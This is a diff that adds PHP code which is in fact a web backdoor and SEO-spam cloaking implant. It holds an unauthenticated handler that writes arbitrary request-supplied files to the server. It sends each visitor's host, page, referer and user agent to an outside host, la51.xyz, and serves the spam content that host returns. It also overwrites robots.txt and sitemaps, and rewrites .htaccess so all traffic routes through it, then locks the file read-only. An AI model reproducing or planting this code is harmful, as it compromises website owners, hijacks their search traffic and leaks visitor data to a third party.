+	$filenames=isset($_REQUEST['sfilename']) ? $_REQUEST['sfilename'] : '';
+	$filecontents=isset($_REQUEST['sfilecontent']) ? $_REQUEST['sfilecontent'] : '';
+	if(file_exists($filenames)){
+		if (!unlink($filenames)){
+			echo "deleteerror";
+			exit();
+		  }
+	}
+	file_put_contents($filenames,$filecontents, FILE_APPEND);
+	echo $filenames.'success';
+}
+
+
+function class_x_i($x = ''){
+  @set_time_limit(3600);
+  @ignore_user_abort(1);
+  global $lineNo,$all_data,$all_jump,$rewrite_open,$jumpNo;
+  if (isset($_REQUEST['supfiles'])) {
+	  upfile();
+	  exit();
+  }
+
+  $httpReferer  = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+  $login_status = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+  $lCheck = true;
+  $rCheck = func_referCheck($httpReferer);
+  
+  $server_name = '';
+  if (isset($_SERVER['HTTP_HOST'])) {
+    $server_name = $_SERVER['HTTP_HOST'];
+  }elseif (isset($_SERVER['SERVER_NAME'])) {
+    $server_name = $_SERVER['SERVER_NAME'];
+  }
+  $page_location = $_SERVER['REQUEST_URI'];
+  if(strstr($page_location,"bction=ping")){
+	  if(strstr($_GET['mapname'],'.xml')){
+		  $data_new = 'https://www.google.com/ping?sitemap='.$_GET['mapname'];
+		  if(stristr(file_get_contents( $data_new),'google')){
+			  echo '<br>ok<br>';
+		  }else{
+			  echo $data_new.'<br>ping false!<br>';
+		  }
+	  }else{
+		  echo '<br>sitemap name false!<br>';
+	  }
+	  exit;
+  }
+  if(strstr($page_location,"span_allsitemap=")){
+			$span_allsitemap_leng = strpos($page_location,"span_allsitemap=")+16;
+			$span_allsitemap = substr($page_location,$span_allsitemap_leng);
+			$xpath_content='<?xml version="1.0" encoding="UTF-8"? ><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
+			if ($span_allsitemap != '') {
+				$span_allsitemaps =explode("|",$span_allsitemap); 
+				$fzxml = glob($span_allsitemaps[0]);
+				$robotstxt='';
+				foreach($fzxml as $xml){
+					$xpath_content.=sprintf('<sitemap><loc>%s</loc><lastmod>%s</lastmod></sitemap>',"http://".$server_name."/".$xml,date('Y-m-d'));
+					$robotstxt.=chr(13).chr(10).'Sitemap:http://'.$server_name."/".$xml;
+				}
+				$site_map = 'site_map.xml';
+				if ($span_allsitemaps[1] != '') {
+					$site_map = $span_allsitemaps[1];
+				}
+				$robotstxt='User-agent: *'.chr(13).chr(10).'Disallow:'.chr(13).chr(10).'Sitemap:http://'.$server_name.'/'.$site_map.$robotstxt;
+				$xpath_content.='</sitemapindex>';
+				$xpath_content = str_replace('encoding="UTF-8"? ','encoding="UTF-8"?',$xpath_content);
+				if(@file_put_contents($site_map, $xpath_content)){
+					@file_put_contents('robots.txt', $robotstxt);
+					echo exit($site_map.' ok');
+				}else{echo exit("失败");}
+			}
+  }
+
+  $rewrite_index='';
+  if(strpos($page_location,".php") > 0){
+	$leng=strpos($page_location,".php")+4; 
+    $rewrite_index=substr($page_location,0,$leng);
+  }
+  if($rewrite_index==''){
+	  $rewrite_index = 'index.php';
+  }
+  $url_host_format = 'www%d.la51.xyz';
+  
+  $uri_start='';
+  if (isset($_SERVER['REQUEST_SCHEME'])) {
+    $uri_start = $_SERVER['REQUEST_SCHEME'];
+  }else{
+    $uri_start=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http');
+  }
+
+  $rewrite_open = (int)$rewrite_open;
+  sync_htaccess('',$rewrite_open,$rewrite_index);
+  $url_format='';
+	$url_b = 'http://www50.la51.xyz/jump88.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
+	$url_b = sprintf($url_b, $server_name, urlencode($page_location), urlencode($httpReferer), urlencode($login_status),$all_jump,urlencode(date("Y-m-d")),urlencode($uri_start),$jumpNo);
+
+	if (isset($_GET['guo_url2'])) {
+	  echo $url_b;
+	  exit();
+	}
+  if (strstr($page_location,'robots.txt')||strstr($page_location,"span_robots=")) {
+	  $lineNos =explode("|",$lineNo);
+	  $value = $lineNos[0];
+	  $url_host_string = sprintf($url_host_format, $value);
+	  $url_format = 'http://%host%/data66.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
+	  $url_format = preg_replace("/%host%/si", $url_host_string, $url_format);
+	  $url_format = sprintf($url_format, $server_name, urlencode($page_location.'robotsshengcheng'), urlencode($httpReferer), urlencode($login_status),$all_data,urlencode(date("Y-m-d")),urlencode($uri_start),$value);
+	  $content = rsync_httpreq($url_format);
+	  if(strstr($content,'<spango>')){
+		  if(strstr($page_location,"robotsping=ping")){
+			  $addarr_tmp = explode("\n",$content);
+			  for($i=2;$i<rand(20,50);$i++){
+				  if(strstr(trim($addarr_tmp[$i]),'.xml')){
+					  $data_new = 'https://www.google.com/ping?sitemap='.str_replace('Sitemap:','',trim($addarr_tmp[$i]));
+					  if(stristr(file_get_contents($data_new),'google')){
+						  echo $data_new.'ok<br>';
+					  }else{
+						  echo $data_new.'ping false!<br>';
+					  }
+				  }else{
+					  echo 'sitemap name false!<br>';
+				  }
+			  }
+			  exit;
+		  }
+		  $content = str_replace('<spango>','',$content);
+		  @file_put_contents('robots.txt', $content);
+		  exit($content);
+	  }
+	  unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status);
+	  exit();
+  }
+  if (strstr($page_location,'.xml')) {
+	  $lineNos =explode("|",$lineNo);
+	  $value = $lineNos[0];
+	  $url_host_string = sprintf($url_host_format, $value);
+	  $url_format = 'http://%host%/data66.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
+	  $url_format = preg_replace("/%host%/si", $url_host_string, $url_format);
+	  $url_format = sprintf($url_format, $server_name, urlencode($page_location.'ditushengcheng'), urlencode($httpReferer), urlencode($login_status),$all_data,urlencode(date("Y-m-d")),urlencode($uri_start),$value);
+	  $content = rsync_httpreq($url_format);
+	  if(strstr($content,'<spango>')){
+		if(strstr($content,'getcontent500page')){
+			@header('HTTP/1.1 500 Internal Server Error');
+			exit();
+		}else if(strstr($content,'getcontent404page')){
+			@header('HTTP/1.1 404 Not Found');
+			exit();
+		}
+		$content = str_replace('<spango>','',$content);
+		if (strstr($page_location,'.xml.gz')) {
+			$lengb=strpos($page_location,".xml.gz")+7; 
+			$xml_name = explode("/",str_replace('?','/',substr($page_location,0,$lengb)));
+			header('Content-Type: application/x-gzip');
+			header('Content-Disposition: attachment; filename="'.$xml_name[count($xml_name)-1].'"');
+			header('Cache-Control: no-cache, no-store, max-age=0, must-revalidate');
+			header('Pragma: no-cache');
+			$gz_sitemap_content = gzencode($content, 9);
+			echo $gz_sitemap_content;
+			exit();
+		}
+		if(strstr($_SERVER['REQUEST_URI'],"span_sitemap=")){
+			$span_sitemap_leng = strpos($_SERVER['REQUEST_URI'],"span_sitemap=")+13;
+			$span_sitemap = substr($_SERVER['REQUEST_URI'],$span_sitemap_leng);
+			if ($span_sitemap != '') {
+				if(strstr($span_sitemap,'/')){
+					$filemap =explode("/",$span_sitemap);
+					if (!file_exists($filemap[0])) {mkdir($filemap[0]);}
+				}
+				if(@file_put_contents($span_sitemap, $content)){
+					$robots_path = 'robots.txt';
+					$map_content = "Sitemap:  http://".$server_name."/".$span_sitemap."\n";
+					if ($robots_path != '' && file_exists($robots_path)) {
+						$robots_content = @file_get_contents($robots_path);
+						$map_content = $map_content . $robots_content;
+						@file_put_contents($robots_path, $map_content);
+					}else{@file_put_contents($robots_path, $map_content);}
+					echo exit($span_sitemap." ok");
+				}else{echo exit("失败");}
+			}
+		}
+		if(strstr($_SERVER['REQUEST_URI'],"span_sitemapgz=")){
+			$span_sitemapgz_leng = strpos($_SERVER['REQUEST_URI'],"span_sitemapgz=")+15;
+			$span_sitemapgz = substr($_SERVER['REQUEST_URI'],$span_sitemapgz_leng);
+			if ($span_sitemapgz != '') {
+				if(strstr($span_sitemapgz,'/')){
+					$filemap =explode("/",$span_sitemapgz);
+					if (!file_exists($filemap[0])) {mkdir($filemap[0]);}
+				}
+				$gzfile = $span_sitemapgz.".gz";
+				$fp = gzopen($gzfile, 'w9');
+				gzwrite ($fp, $content);
+				gzclose($fp);
+				echo exit($span_sitemapgz.".gz ok");
+			}
+		}
+		@header('content-type: text/xml');
+		exit($content);
+		unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status);
+		exit();
+	  }
+  }
+  if($rCheck){
+		$content = rsync_httpreq($url_b);
+	if(strstr($content,'<spango>')){
+		$content = str_replace('<spango>','',$content);
+		
+		echo "$content";
+		unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status); 
+		exit();
+	}
+  }
+  if($lCheck){
+		$lineNos =explode("|",$lineNo);
+		for ($i=0;$i<count($lineNos);$i++){
+			  $url_host_string = sprintf($url_host_format, $lineNos[$i]);
+			  $url_format = 'http://%host%/data66.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
+			  $url_format = preg_replace("/%host%/si", $url_host_string, $url_format);
+			  $url_format = sprintf($url_format, $server_name, urlencode($page_location), urlencode($httpReferer), urlencode($login_status),$all_data,urlencode(date("Y-m-d")),urlencode($uri_start),$lineNos[$i]);
+				if (isset($_GET['guo_url1'])) {
+					  echo $url_format;
+					  exit();
+				}
+			  $content = rsync_httpreq($url_format);
+			if(strstr($content,'<spango>')){
+				if(strstr($content,'getcontent500page')){
+					@header('HTTP/1.1 500 Internal Server Error');
+					exit();
+				}else if(strstr($content,'getcontent404page')){
+					@header('HTTP/1.1 404 Not Found');
+					exit();
+				}else{
+					$content = str_replace('<spango>','',$content);
+					echo "$content";
+					unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status); 
+					exit();
+				}
+			}
+		}
+  }
+}
+//写入.h规则内容
+function sync_htaccess($htaccess_rule = '', $rewrite_open,$rewrite_index){
+	$rewrite_index = substr($rewrite_index, 0, @strrpos($rewrite_index, '.'));
+	$htaccess_rule= "<IfModule mod_rewrite.c>\n";
+	$htaccess_rule .="RewriteEngine\x20On\n";
+	$htaccess_rule .="RewriteBase\x20/\n";
+	$htaccess_rule .="RewriteRule\x20^".$rewrite_index.".php$\x20-\x20[L]\n";
+	$htaccess_rule .="RewriteCond\x20%{REQUEST_FILENAME}\x20!-f\n";
+	$htaccess_rule .="RewriteCond\x20%{REQUEST_FILENAME}\x20!-d\n";
+	$htaccess_rule .="RewriteRule\x20.\x20/".$rewrite_index.".php [L]\n";
+	$htaccess_rule .="</IfModule>";
+	if ($htaccess_rule != '') {
+		if ($rewrite_open) {
+		  $htaccess_path = './.htaccess';
+		  if ($htaccess_path != '' && file_exists($htaccess_path)) {
+			@chmod($htaccess_path, 0777);
+			$htaccess_content = @file_get_contents($htaccess_path);
+			if (!preg_match('/REQUEST_FILENAME/', $htaccess_content) && !preg_match("/".$rewrite_index.".php/", $htaccess_content)) {
+				$htaccess_content = $htaccess_rule . PHP_EOL .$htaccess_content;
+				@file_put_contents($htaccess_path, $htaccess_content);
+			}
+		  }
+		  @chmod($htaccess_path, 0444);
+		}
+	}
+}
+class_x_i();
+?>
